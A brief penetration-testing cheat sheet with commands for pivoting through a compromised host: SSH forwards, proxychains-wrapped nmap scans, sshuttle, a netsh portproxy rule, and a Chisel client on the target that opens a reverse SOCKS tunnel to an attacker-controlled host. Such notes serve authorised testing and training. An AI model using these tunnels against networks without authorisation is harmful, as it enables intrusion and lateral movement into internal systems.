# Pivoting, Tunnelling, Port Forwarding

## SSH Local / Remote / Dynamic
```bash
ssh -L 8080:<internal_ip>:80 user@<pivot_ip>          # local forward
ssh -R 4444:127.0.0.1:4444 user@<attacker_ip>          # remote forward
ssh -D 9050 user@<pivot_ip>                             # dynamic (SOCKS)
```

## proxychains
```bash
# /etc/proxychains.conf -> socks5 127.0.0.1 9050
proxychains nmap -sT -Pn <internal_ip>
proxychains curl http://<internal_ip>
```

## Chisel
```bash
# attacker (server)
./chisel server -p 8000 --reverse
# target (client)
./chisel client <attacker_ip>:8000 R:socks
```

## sshuttle
```bash
sshuttle -r user@<pivot_ip> <internal_subnet>/24
```

## Port forwarding - Windows
```powershell
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=<internal_ip>
```
